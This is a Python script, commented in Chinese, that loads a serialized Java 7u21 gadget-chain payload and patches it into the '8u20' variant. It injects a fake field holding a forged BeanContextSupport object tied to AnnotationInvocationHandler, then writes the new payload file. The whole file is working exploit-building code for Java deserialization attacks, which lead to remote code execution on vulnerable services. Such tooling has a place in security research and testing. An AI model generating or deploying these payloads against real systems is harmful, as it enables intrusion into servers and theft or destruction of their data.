import yaml

from javaSerializationTools import JavaString, JavaField, JavaObject, JavaEndBlock
from javaSerializationTools import ObjectRead
from javaSerializationTools import ObjectWrite

if __name__ == '__main__':

    with open("../files/7u21.ser", "rb") as f:
        a = ObjectRead(f)
        obj = a.readContent()

        # 第一步，向HashSet添加一个假字段，名字fake
        signature = JavaString("Ljava/beans/beancontext/BeanContextSupport;")
        fakeSignature = {'name': 'fake', 'signature': signature}
        obj.javaClass.superJavaClass.fields.append(fakeSignature)
        # 构造假的BeanContextSupport反序列化对象，注意要引用后面的AnnotationInvocationHandler
        # 读取BeanContextSupportClass的类的简介
        with open('BeanContextSupportClass.yaml', 'r') as f1:
            BeanContextSupportClassDesc = yaml.load(f1.read(), Loader=yaml.FullLoader)

        # 向beanContextSupportObject添加beanContextChildPeer属性
        beanContextSupportObject = JavaObject(BeanContextSupportClassDesc)
        beanContextChildPeerField = JavaField('beanContextChildPeer',
                                              JavaString('Ljava/beans/beancontext/BeanContextChild'),
                                              beanContextSupportObject)
        beanContextSupportObject.fields.append([beanContextChildPeerField])

        # 向beanContextSupportObject添加serializable属性
        serializableField = JavaField('serializable', 'I', 1)
        beanContextSupportObject.fields.append([serializableField])

        # 向beanContextSupportObject添加objectAnnontations 数据
        beanContextSupportObject.objectAnnotation.append(JavaEndBlock())
        AnnotationInvocationHandler = obj.objectAnnotation[2].fields[0][0].value
        beanContextSupportObject.objectAnnotation.append(AnnotationInvocationHandler)

        # 把beanContextSupportObject对象添加到fake属性里
        fakeField = JavaField('fake', fakeSignature['signature'], beanContextSupportObject)
        obj.fields[0].append(fakeField)


    with open("8u20.ser", 'wb') as f:
        o = ObjectWrite(f)
        o.writeContent(obj)

